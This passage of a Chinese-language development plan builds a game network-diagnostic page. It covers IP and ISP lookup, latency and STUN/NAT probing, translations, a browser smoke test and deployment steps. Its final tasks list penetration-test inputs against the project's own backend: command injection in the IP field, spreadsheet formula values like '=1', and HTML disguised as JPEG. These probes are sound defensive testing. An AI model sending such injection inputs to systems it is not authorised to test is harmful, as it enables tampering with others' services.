    { ip: '1.2.3.4', port: 5000, relPort: 6000 }, { ip: '1.2.3.4', port: 7000, relPort: 6001 },
  ]), 'cone');
});

test('resolveServers: country match, * fallback, failure', () => {
  const f = loadFrontend();
  const all = [
    { region: 'LATAM', name: 'Queretaro', ip: '1.1.1.1', countries: ['MX'] },
    { region: 'LATAM', name: 'Sao Paulo', ip: '2.2.2.2', countries: ['MX', 'BR'] },
    { region: 'APAC', name: 'Singapore', ip: '3.3.3.3', countries: ['*'] },
  ];
  const mx = f.resolveServers('mx', all);
  assert.strictEqual(mx.region, 'LATAM');
  assert.deepStrictEqual(mx.servers.map(s => s.label), ['Queretaro', 'Sao Paulo']);
  const fr = f.resolveServers('FR', all);
  assert.strictEqual(fr.region, 'Other');
  assert.deepStrictEqual(fr.servers.map(s => s.ip), ['3.3.3.3']);
  const none = f.resolveServers('KR', null);
  assert.strictEqual(none.failed, true);
  assert.strictEqual(none.servers.length, 0);
});

test('parseCfTrace / extractIspInfo / ptrName', () => {
  const f = loadFrontend();
  const cf = f.parseCfTrace('ip=1.2.3.4\ncolo=ICN\nloc=KR\nwarp=off\n');
  assert.strictEqual(cf.colo, 'ICN');
  assert.strictEqual(cf.loc, 'KR');
  assert.deepStrictEqual(JSON.parse(JSON.stringify(f.extractIspInfo('ipwho', {
    success: true, city: 'Seoul', country_code: 'KR', connection: { asn: 4766, isp: 'Korea Telecom' } }))),
    { isp: 'Korea Telecom', asn: 'AS4766', city: 'Seoul', countryCode: 'KR' });
  assert.deepStrictEqual(JSON.parse(JSON.stringify(f.extractIspInfo('ipinfo', {
    org: 'AS36925 MEDITELECOM', city: 'Casablanca', country: 'MA' }))),
    { isp: 'MEDITELECOM', asn: 'AS36925', city: 'Casablanca', countryCode: 'MA' });
  assert.strictEqual(f.extractIspInfo('ipwho', { success: false }), null);
  assert.strictEqual(f.ptrName('41.92.118.61'), '61.118.92.41.in-addr.arpa');
  assert.strictEqual(f.ptrName('2001:db8::1'), null);
});

test('issueTimeUtc converts the player local time', () => {
  const f = loadFrontend();
  const expected = new Date('2026-11-17T21:05').toISOString().slice(0, 16) + 'Z';
  assert.strictEqual(f.issueTimeUtc('2026-11-17', '21:05'), expected);
  assert.strictEqual(f.issueTimeUtc('2026-11-17', ''), '');
});
```

- [ ] **Step 2: 執行，確認失敗**

Run: `node tests/run.js`
Expected: 5 項 FAIL

- [ ] **Step 3: 實作**（放在 `index.html` 的 `<script>` 內，`init()` 只在 `!window.__TEST__` 時執行）

```js
const LATENCY_TARGETS = [
  { key: 'SG',  url: 'https://cos.ap-singapore.myqcloud.com/' },
  { key: 'FRA', url: 'https://cos.eu-frankfurt.myqcloud.com/' },
  { key: 'SAO', url: 'https://cos.sa-saopaulo.myqcloud.com/' },
  { key: 'QRO', url: 'https://cos.na-queretaro.myqcloud.com/' },
  { key: 'SEL', url: 'https://cos.ap-seoul.myqcloud.com/', reference: true },
];

function latencyStats(samples) {
  const ok = samples.filter(x => typeof x === 'number');
  const loss = Math.round((samples.length - ok.length) / samples.length * 100);
  if (!ok.length) return { median: null, jitter: null, loss };
  const sorted = ok.slice().sort((a, b) => a - b);
  const mid = sorted.length >> 1;
  const median = Math.round(sorted.length % 2 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2);
  let jitter = null;
  if (ok.length > 1) {
    let sum = 0;
    for (let i = 1; i < ok.length; i++) sum += Math.abs(ok[i] - ok[i - 1]);
    jitter = Math.round(sum / (ok.length - 1));
  }
  return { median, jitter, loss };
}

// Browsers merge identical candidates, so a single mapping is reported as cone
function classifyNat(cands) {
  const v4 = cands.filter(c => /^\d{1,3}(\.\d{1,3}){3}$/.test(c.ip));
  if (!v4.length) return 'blocked';
  const byBase = {};
  v4.forEach(c => { (byBase[c.relPort] = byBase[c.relPort] || new Set()).add(c.port); });
  return Object.values(byBase).some(ports => ports.size > 1) ? 'symmetric' : 'cone';
}

function resolveServers(countryCode, all) {
  if (!Array.isArray(all)) return { servers: [], region: 'Other', failed: true };
  const toServer = s => ({ label: s.name, ip: s.ip });
  const code = String(countryCode || '').toUpperCase();
  const matched = code ? all.filter(s => s.countries.includes(code)) : [];
  if (matched.length) return { servers: matched.map(toServer), region: matched[0].region };
  return { servers: all.filter(s => s.countries.includes('*')).map(toServer), region: 'Other' };
}

function parseCfTrace(text) {
  const out = {};
  String(text || '').split('\n').forEach(line => {
    const i = line.indexOf('=');
    if (i > 0) out[line.slice(0, i).trim()] = line.slice(i + 1).trim();
  });
  return out;
}

function extractIspInfo(source, d) {
  if (!d) return null;
  if (source === 'ipwho') {
    if (!d.success || !d.connection) return null;
    return {
      isp: d.connection.isp || d.connection.org || '',
      asn: d.connection.asn ? 'AS' + d.connection.asn : '',
      city: d.city || '', countryCode: (d.country_code || '').toUpperCase(),
    };
  }
  if (source === 'ipinfo') {
    if (!d.org) return null;
    const m = /^(AS\d+)\s*(.*)$/.exec(d.org);
    return {
      isp: m ? m[2] : d.org, asn: m ? m[1] : '',
      city: d.city || '', countryCode: (d.country || '').toUpperCase(),
    };
  }
  if (source === 'ipapi') {
    const asnText = typeof d.asn === 'string' ? d.asn : (d.asn && d.asn.asn ? 'AS' + d.asn.asn + ' ' + (d.asn.org || '') : '');
    const m = /^(AS\d+)\s*(.*)$/.exec(asnText);
    if (!m) return null;
    return { isp: m[2], asn: m[1], city: d.city || '', countryCode: '' };
  }
  return null;
}

function ptrName(ip) {
  const p = String(ip).split('.');
  return p.length === 4 ? p.reverse().join('.') + '.in-addr.arpa' : null;
}

function issueTimeUtc(d, ti) {
  if (!d || !ti) return '';
  const at = new Date(`${d}T${ti}`);
  return isNaN(at) ? '' : at.toISOString().slice(0, 16) + 'Z';
}
```

`buildIssueTime()` 從 DF 原樣搬過來（讀 `#issue-date`、`#issue-time`、`state.timezone`）。

- [ ] **Step 4: 執行，確認通過**

Run: `node tests/run.js`
Expected: `19/19 passed`

- [ ] **Step 5: Commit**

```bash
git add index.html i18n.js tests/frontend.test.js && git commit -m "feat(frontend): pure helpers for latency, NAT, servers and ISP parsing"
```

---

### Task 6: 前端網路收集

**Files:**
- Modify: `index.html`

這一段要打真實的網路，不寫單元測試，由 Task 9 的 headless Chrome 驗證。

- [ ] **Step 1: 實作**

```js
async function fetchWithTimeout(url, ms, opts = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), ms);
  try { return await fetch(url, { ...opts, signal: ctrl.signal }); }
  finally { clearTimeout(timer); }
}
const getJson = (url, ms = 5000) => fetchWithTimeout(url, ms).then(r => r.json()).catch(() => null);
const getText = (url, ms = 5000) => fetchWithTimeout(url, ms).then(r => r.text()).catch(() => null);

async function detectIdentity() {
  const ipify = await getJson('https://api4.ipify.org?format=json', 8000);
  state.ip = ipify && ipify.ip || null;
  renderIdentity();
  if (!state.ip) return;

  const [isp, ripe, ptr, cf1, cf2] = await Promise.all([
    (async () =>
      extractIspInfo('ipwho',  await getJson(`https://ipwho.is/${state.ip}`)) ||
      extractIspInfo('ipinfo', await getJson(`https://ipinfo.io/${state.ip}/json`)) ||
      extractIspInfo('ipapi',  await getJson(`https://api.ipapi.is/?q=${state.ip}`)))(),
    getJson(`https://stat.ripe.net/data/network-info/data.json?resource=${state.ip}`),
    ptrName(state.ip) ? getJson(`https://dns.google/resolve?name=${ptrName(state.ip)}&type=PTR`) : null,
    getText('https://1.1.1.1/cdn-cgi/trace'),
    getText('https://www.cloudflare.com/cdn-cgi/trace'),
  ]);

  const t1 = parseCfTrace(cf1), t2 = parseCfTrace(cf2);
  state.isp         = isp && isp.isp || '';
  state.asn         = isp && isp.asn || (ripe && ripe.data && ripe.data.asns && ripe.data.asns[0] ? 'AS' + ripe.data.asns[0] : '');
  state.city        = isp && isp.city || '';
  state.countryCode = isp && isp.countryCode || t1.loc || t2.loc || '';
  state.prefix      = ripe && ripe.data && ripe.data.prefix || '';
  const ans = ptr && Array.isArray(ptr.Answer) ? ptr.Answer.find(a => a.type === 12) : null;
  state.rdns        = ans ? ans.data.replace(/\.$/, '') : '';
  state.egressIps   = [...new Set([state.ip, t1.ip, t2.ip].filter(Boolean))];
  state.cfColo      = t1.colo || t2.colo || '';
  state.warp        = (t1.warp && t1.warp !== 'off') || (t2.warp && t2.warp !== 'off') ? 'on' : (t1.warp || t2.warp ? 'off' : '');
  renderIdentity();
}

async function timeOnce(url) {
  const t0 = performance.now();
  try {
    await fetchWithTimeout(`${url}?r=${Math.random().toString(36).slice(2)}`, 3000, { mode: 'no-cors', cache: 'no-store' });
    return Math.round(performance.now() - t0);
  } catch { return null; }
}

async function measureLatency() {
  for (const target of LATENCY_TARGETS) {
    await timeOnce(target.url);            // warm-up: DNS + TLS
    const samples = [];
    for (let i = 0; i < 10; i++) samples.push(await timeOnce(target.url));
    state.latency[target.key] = latencyStats(samples);
    renderLatency();
  }
}

function probeUdp(timeoutMs = 5000) {
  return new Promise(resolve => {
    if (typeof RTCPeerConnection === 'undefined') return resolve('');
    let pc, done = false;
    const cands = [];
    const finish = () => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      try { pc.close(); } catch {}
      resolve(classifyNat(cands));
    };
    const timer = setTimeout(finish, timeoutMs);
    try {
      pc = new RTCPeerConnection({ iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun.cloudflare.com:3478' },
      ] });
    } catch { clearTimeout(timer); return resolve(''); }
    pc.onicecandidate = e => {
      if (!e.candidate) return finish();
      const line = e.candidate.candidate;
      if (!/ typ srflx/.test(line)) return;           // host candidates (LAN IPs) are never read
      const f = line.split(' ');
      const rport = / rport (\d+)/.exec(line);
      cands.push({ ip: f[4], port: Number(f[5]), relPort: rport ? Number(rport[1]) : 0 });
    };
    pc.createDataChannel('probe');
    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(finish);
  });
}

async function runAutoChecks() {
  state.measuring = true;
  renderSubmit();
  const all = (async () => {
    const [, udp] = await Promise.all([detectIdentity(), probeUdp()]);
    state.udpNat = udp;
    renderUdp();
    await measureLatency();
  })();
  await Promise.race([all, new Promise(r => setTimeout(r, 30000))]);
  state.measuring = false;
  renderSubmit();
}
```

伺服器清單照 DF 的 `fetchServerConfig()`（8 秒逾時），在 `detectIdentity()` 完成後呼叫 `resolveServers(state.countryCode, config)`。`failed` 時 Step 3 顯示 `serversFailed` 加重試按鈕，重試只會重新抓清單。

- [ ] **Step 2: Commit**

```bash
git add index.html && git commit -m "feat(frontend): identity lookup, latency, UDP probe"
```

---

### Task 7: 版面、繪製、送出

**Files:**
- Modify: `index.html`

- [ ] **Step 1: 版面**

CSS 從 DF 搬過來（`.card`、`.data-grid`、`.code-block`、`.copy-btn`、`.paste-area`、`.btn-submit`、`.upload-*`），另外加：

```css
[dir="rtl"] .instructions li::before { left: auto; right: 0; }
[dir="rtl"] .instructions li { padding-left: 0; padding-right: 28px; }
.ltr { direction: ltr; unicode-bidi: isolate; text-align: left; }
.lat-table { width: 100%; border-collapse: collapse; font-size: 13px; }
.lat-table th, .lat-table td { padding: 6px 4px; border-bottom: 1px solid #e2e8f0; text-align: start; }
.lat-ref { color: #94a3b8; font-size: 10px; }
.warn { color: #d97706; }
.choice { display: inline-flex; align-items: center; gap: 4px; margin: 0 12px 6px 0; font-size: 13px; }
details.advanced summary { cursor: pointer; font-size: 12px; color: #4f46e5; margin: 8px 0; }
```

元素 ID（`render*` 函式與測試依賴這些名稱）：

| 區塊 | ID |
|---|---|
| 頁首 | `header-game`、`lang-select`（9 個 `<option>`：en、zh、vi、th、id、es、ko、pt、ar） |
| Step 1 | `val-ip`、`val-isp`、`val-asn`、`val-prefix`、`val-location`、`val-rdns`、`val-colo`、`val-egress`、`val-os`、`val-timezone`、`connection-cell`、`val-connection` |
| Step 2 | `measure-status`、`lat-row-<KEY>`（每列有 `.lat-median`、`.lat-jitter`、`.lat-loss`）、`val-udp` |
| Step 3 | `step3-content` |
| Step 4 | `roleid-input`、`nickname-input`、`input[name=networkType]`、`input[name=vpn]`、`input[name=issueType]`（checkbox）、`ingame-ping`、`input[name=issuePattern]`、`issue-date`、`issue-time` |
| Step 5 | `submit-btn`、`submit-error` |

IP、網段、出口 IP、反解、指令、`.paste-area` 一律加 `class="ltr"`。Role ID 說明圖用 `img/roleid.jpg`。

- [ ] **Step 2: 繪製函式**

- `renderIdentity()`：填 Step 1；取得前顯示 `…`；失敗顯示 `t('failed')` 加 `↺`（呼叫 `detectIdentity()`）；`state.egressIps.length > 1` 時 `val-egress` 加 `.warn`，顯示 `t('egressMulti')` 與 IP 清單；`state.warp === 'on'` 時在出口後加 `t('warpOn')`。
- `renderLatency()`：未量的列顯示 `…`，已量的列填 `median ms`／`jitter ms`／`loss%`；`median === null` 顯示 `t('timeout')`；SEL 列標籤後加 `<span class="lat-ref">${t('refTag')}</span>`；`measure-status` 顯示 `t('measuring')` 或 `t('measureDone')`。
- `renderUdp()`：`cone`→`t('udpCone')`，`symmetric`→`t('udpSymmetric')`，`blocked`→`t('udpBlocked')`，空字串→`t('udpUnsupported')`。
- `renderStep3()`：DF 的 `renderStep2()` 改名搬過來，命令改成 Windows `tracert -d <IP>`、macOS `traceroute -n <IP>`；Windows 每台多一個 `<details class="advanced">`，內含 `pathping -n <IP>`、複製鈕、`id="pathping-<ip>"` 的貼上框，寫入 `state.pathpings[ip]`；清單載入失敗時顯示 `t('serversFailed')` 與重試鈕。
- `renderSubmit()`：`state.measuring` 時按鈕停用並顯示 `t('measuringBtn')`，否則顯示 `t('submitBtn')`。
- `setLang(lang)`：DF 版本，另外設 `document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr'`，並重繪所有 `render*`。
- `detectLang()`：DF 版本，再加 `ko`、`pt`、`ar`。

- [ ] **Step 3: 送出**

`submitReport()` 由 DF 版改寫，payload：

```js
const checked = name => [...document.querySelectorAll(`input[name=${name}]:checked`)].map(el => el.value);
const payload = {
  ip: state.ip, countryCode: state.countryCode, isp: state.isp, asn: state.asn, prefix: state.prefix,
  city: state.city, rdns: state.rdns, egressIps: state.egressIps, cfColo: state.cfColo, warp: state.warp,
  latency: state.latency, udpNat: state.udpNat,
  issueTime: buildIssueTime(),
  issueTimeUtc: issueTimeUtc(document.getElementById('issue-date').value, document.getElementById('issue-time').value),
  issuePattern: checked('issuePattern')[0] || '', issueType: checked('issueType'),
  inGamePing: document.getElementById('ingame-ping').value.trim(),
  roleId: sanitizeText(document.getElementById('roleid-input').value.trim(), 100),
  nickname: sanitizeText(document.getElementById('nickname-input').value.trim(), 50),
  networkType: checked('networkType')[0] || '', vpn: checked('vpn')[0] || '',
  os: state.os, browser: state.browser, screen: state.screen, timezone: state.timezone,
  connectionType: state.connectionType, deviceMemory: state.deviceMemory, cpuCores: String(state.cpuCores || ''),
  platform: getActivePlatform(), region: state.region, language: currentLang,
  servers: state.matchedServers.map(s => ({ label: s.label, ip: s.ip,
    traceroute: state.traces[s.ip] || '', pathping: state.pathpings[s.ip] || '' })),
  screenshots: state.screenshots,
};
```

POST 方式與 DF 相同（`mode: 'no-cors'`）。

- [ ] **Step 4: 本機開頁檢查**

Run: `cd "/Users/linst/Library/Mobile Documents/com~apple~CloudDocs/Steve_code/project/mho-network-check" && python3 -m http.server 8765`
在 Chrome 開 `http://localhost:8765/`：Step 1 有值、Step 2 逐列填入、切換 9 種語言不報錯、切阿拉伯文時整頁鏡像但 IP 和指令沒有顛倒。

- [ ] **Step 5: 確認單元測試仍通過**

Run: `node tests/run.js`
Expected: `19/19 passed`

- [ ] **Step 6: Commit**

```bash
git add index.html && git commit -m "feat(frontend): layout, rendering, RTL and submit"
```

---

### Task 8: 9 種語言

**Files:**
- Modify: `i18n.js`
- Create: `tests/i18n.test.js`

- [ ] **Step 1: 寫失敗的測試**

```js
const LANGS = ['en', 'zh', 'vi', 'th', 'id', 'es', 'ko', 'pt', 'ar'];

test('all 9 languages exist with exactly the en keys', () => {
  const I18N = loadI18n();
  assert.deepStrictEqual(Object.keys(I18N).sort(), LANGS.slice().sort());
  const en = Object.keys(I18N.en).sort();
  assert.ok(en.length > 80, 'en has ' + en.length + ' keys');
  for (const l of LANGS) assert.deepStrictEqual(Object.keys(I18N[l]).sort(), en, l);
});

test('no empty strings and UI terms stay in English', () => {
  const I18N = loadI18n();
  for (const l of LANGS) {
    for (const [k, v] of Object.entries(I18N[l])) assert.ok(String(v).trim(), `${l}.${k} empty`);
    assert.ok(I18N[l].roleIdLabel.includes('Role ID'), l + ' roleIdLabel');
  }
});

test('every data-i18n key used in index.html exists in en', () => {
  const html = require('fs').readFileSync(require('path').join(__dirname, '..', 'index.html'), 'utf8');
  const used = [...html.matchAll(/data-i18n(?:-placeholder)?="([^"]+)"|t\('([^']+)'\)/g)].map(m => m[1] || m[2]);
  const en = loadI18n().en;
  for (const k of new Set(used)) assert.ok(k in en, 'missing en.' + k);
});
```

- [ ] **Step 2: 執行，確認失敗**

Run: `node tests/run.js`
Expected: 3 項 FAIL

- [ ] **Step 3: 寫 `en`**

key 清單：
`step1Label yourIP yourISP asnLabel prefixLabel locationLabel rdnsLabel coloLabel egressLabel egressSingle egressMulti warpOn deviceOS timezoneLabel connectionType failed step2Label measuring measureDone timeout latRegion latMedian latJitter latLoss regionSG regionFRA regionSAO regionQRO regionSEL refTag udpLabel udpCone udpSymmetric udpBlocked udpUnsupported step3Label serversLoading serversFailed retryBtn traceInstr1Win traceInstr1Mac traceInstr2 traceInstr3 traceHint pastePlaceholder advancedToggle pathpingInstr iosStep1 iosStep2 iosStep3 iosStep4 iosStep5 androidStep1 androidStep2 androidStep3 androidStep4 androidStep5 iosIPsLabel androidIPsLabel iosAppStoreBtn androidPlayBtn uploadScreenshot uploadPreviewAlt uploadCountError uploadSizeError step4Label roleIdLabel roleIdGuide roleIdPlaceholder roleIdImgCaption nicknameLabel nicknamePlaceholder nicknameGuide networkTypeLabel netWired netWifi netMobile vpnLabel vpnYes vpnNo vpnUnsure issueTypeLabel typeHighLatency typeLagSpike typeDisconnect typeLoginFail typeSlowDownload ingamePingLabel ingamePingPlaceholder patternLabel patternConstant patternSpecificHours patternOccasional issueTimeLabel issueTimeSub step5Label disclaimerText submitBtn measuringBtn submitting submittedBtn submitError submitErrorNoIP`

iOS／Android 步驟、traceroute 說明、上傳錯誤訊息的英文以 DF 版為底，`Delta Force` 改為遊戲名稱，Network Analyzer 的 App 名稱與 iOS 18 限制照 DF 現況。`roleIdGuide`：Tap the menu button at the top-right of the lobby → open **Personal Homepage** → tap the copy icon next to **Role ID** at the top-right.

- [ ] **Step 4: 翻譯其餘 8 種**

zh 為繁體中文。不翻：Role ID、Tools、Route、Start、cmd、Terminal、App Store、Google Play、Network Analyzer。阿拉伯文只翻文字，不在字串內加方向控制字元（方向由 `dir` 屬性處理）。

- [ ] **Step 5: 執行，確認通過**

Run: `node tests/run.js`
Expected: `22/22 passed`

- [ ] **Step 6: Commit**

```bash
git add i18n.js tests/i18n.test.js && git commit -m "feat(i18n): 9 languages"
```

---

### Task 9: 說明圖壓縮與瀏覽器實測

**Files:**
- Create: `img/roleid.jpg`；Delete: `img/roleid.png`
- Create: `tests/browser-smoke.js`

- [ ] **Step 1: 壓縮圖片**

```bash
sips -s format jpeg -s formatOptions 70 --resampleWidth 1200 img/roleid.png --out img/roleid.jpg && git rm -q img/roleid.png && ls -la img/
```
Expected: `roleid.jpg` 約 100–250 KB

- [ ] **Step 2: headless Chrome 實測腳本**（node 22 內建 WebSocket，不需套件）

```js
const { spawn } = require('child_process');
const CHROME = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
const url = process.argv[2] || 'http://localhost:8765/';
const lang = process.argv[3] || 'en-US';

(async () => {
  const chrome = spawn(CHROME, ['--headless=new', '--remote-debugging-port=9333',
    `--lang=${lang}`, '--user-data-dir=/tmp/mho-smoke-profile', 'about:blank'], { stdio: 'ignore' });
  await new Promise(r => setTimeout(r, 1500));
  const targets = await (await fetch('http://127.0.0.1:9333/json')).json();
  const ws = new WebSocket(targets.find(t => t.type === 'page').webSocketDebuggerUrl);
  await new Promise(r => ws.addEventListener('open', r));
  let id = 0;
  const call = (method, params = {}) => new Promise(res => {
    const my = ++id;
    ws.addEventListener('message', function h(ev) {
      const m = JSON.parse(ev.data);
      if (m.id === my) { ws.removeEventListener('message', h); res(m.result); }
    });
    ws.send(JSON.stringify({ id: my, method, params }));
  });
  await call('Page.navigate', { url });
  await new Promise(r => setTimeout(r, 35000));
  const r = await call('Runtime.evaluate', { expression: 'JSON.stringify({state, lang: currentLang, dir: document.dir})', returnByValue: true });
  console.log(JSON.stringify(JSON.parse(r.result.value), null, 2));
  ws.close(); chrome.kill();
})();
```

- [ ] **Step 3: 執行實測**

Run（另一個終端機已開 `python3 -m http.server 8765`）：`node tests/browser-smoke.js`
Expected：`state.ip`、`asn`、`prefix`、`cfColo` 有值；`state.latency` 五個地區都有 `median`；`state.udpNat` 為 `cone`／`symmetric`／`blocked`；`state.measuring === false`

Run：`node tests/browser-smoke.js http://localhost:8765/ ar`
Expected：`lang: "ar"`、`dir: "rtl"`

- [ ] **Step 4: 延遲準確度比對**

```bash
for r in ap-singapore eu-frankfurt sa-saopaulo na-queretaro ap-seoul; do
  printf "%-14s " $r
  for i in 1 2 3 4 5; do curl -s -o /dev/null -w "%{time_connect} %{time_namelookup}\n" "https://cos.$r.myqcloud.com/"; done |
    awk '{ print ($1-$2)*1000 }' | sort -n | sed -n 3p
done
```
TCP 握手時間約等於 1 個 RTT。驗收：頁面中位數與這裡的中位數差距在 ±30% 內（或 ±20 ms，取大者）。超出時，回報給 Steve 再決定是否換量測方式。

- [ ] **Step 5: Commit**

```bash
git add img tests/browser-smoke.js && git commit -m "test: browser smoke script; compress Role ID image"
```

---

### Task 10: 文件

**Files:**
- Create: `docs/security.md`（以 `../network-check/docs/security.md` 為底，加入新欄位的驗證表、ISP 摘要與指令只由後端組出、UDP 探測不讀區網 IP）
- Create: `docs/deploy.md`

- [ ] **Step 1: `docs/deploy.md` 內容**

1. 建立 Google 試算表「MHO Network Check」，網址中的 ID 填入 `apps-script.js` 的 `SHEET_ID`
2. 建立 Drive 資料夾「MHO Network Check Screenshots」，ID 填入 `DRIVE_FOLDER_ID`
3. 試算表分享給服務帳號（`google-sheet.json` 裡的 `client_email`），權限「編輯者」
4. 試算表 → 擴充功能 → Apps Script → 貼上 `apps-script.js` → 執行 `setup` 一次並授權
5. 部署 → 新增部署作業 → 類型「網頁應用程式」→ 執行身分「我」→ 存取權「任何人」→ 複製網址
6. 之後的更新只能用：部署 → 管理部署作業 → 鉛筆 → 版本「新版本」→ 部署。**不可再按「新增部署作業」**
7. `IP_Region` 填入各機房 IP 與國碼（含 `*` 列）
8. 網址填進 `index.html` 的 `CONFIG.appsScriptUrl`

- [ ] **Step 2: Commit**

```bash
git add docs && git commit -m "docs: security model and deploy guide"
```

---

### Task 11: 部署與上線驗證（需要 Steve）

- [ ] **Step 1:** Steve 建立 GitHub repo `duodevil/mho-network-check`（空的、Public），Settings → Pages → main／root
- [ ] **Step 2:** Steve 依 `docs/deploy.md` 第 1–5 步建立後端，把 Apps Script 網址給我
- [ ] **Step 3:** 逐列和 Steve 確認 `IP_Region`（國家 → 機房，含 `*` 列），Steve 提供 IP 並開好規則
- [ ] **Step 4:** 填 `CONFIG.appsScriptUrl`，commit，`git remote add origin git@github.com:duodevil/mho-network-check.git && git push -u origin main`
- [ ] **Step 5:** 線上比對：

```bash
curl -sL https://duodevil.github.io/mho-network-check/ -o /tmp/mho-live.html && diff -q /tmp/mho-live.html index.html && echo "線上 = 本地"
```

- [ ] **Step 6:** 滲透測試（每筆間隔 31 秒，Role ID 填 `PENTEST`）：指令注入 IP、公式注入 traceroute／nickname、偽裝成 JPEG 的 HTML、`region: "HACKED"`、同 IP 連送 3 次、`asn: "=1"`、`issueType: ["=1"]`、`latency.SG.median: "=1"`。用 MCP 讀試算表確認每筆的預期結果，再刪除所有 `PENTEST` 列。
- [ ] **Step 7:** Steve 用 iPhone 開線上頁面，確認 UDP／NAT 有結果、Step 3 顯示截圖流程
- [ ] **Step 8:** 送出一筆真實回報，讀試算表確認 43 欄對齊、ISP 摘要與 ping／mtr 指令正確，之後刪除
